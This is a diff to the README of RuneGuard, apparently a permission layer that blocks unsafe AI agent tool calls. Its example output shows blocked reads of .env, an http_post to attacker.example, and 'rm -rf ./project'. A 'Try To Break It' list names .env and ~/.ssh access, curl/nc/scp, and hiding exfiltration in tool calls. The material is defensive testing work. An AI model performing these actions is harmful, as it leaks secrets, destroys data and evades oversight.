@@ -50,10 +50,10 @@ RuneGuard blocks the unsafe actions.
 Expected output:
 
 ```text
-[DecisionType.ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
-[DecisionType.BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
-[DecisionType.BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
-[DecisionType.BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
+[ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
+[BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
+[BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
+[BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
 ```
 
 ## Current Status
@@ -82,3 +82,20 @@ Planned:
 RuneGuard is a runtime permission layer for AI agents.
 
 The long-term goal is to create a real boundary between agent intent and system truth: what the model says it will do versus what the system actually observes and allows.
+
+## What RuneGuard Is Not Yet
+
+RuneGuard is not a sandbox replacement yet.
+
+It does not provide kernel-level enforcement in v0.1.
+
+The current version is a policy plus tool-call enforcement prototype.
+
+## Try To Break It
+
+Ideas:
+
+- make the agent read `.env`
+- make it run `curl`, `nc`, or `scp`
+- make it hide exfiltration inside a normal tool call
+- make it access `~/.ssh`
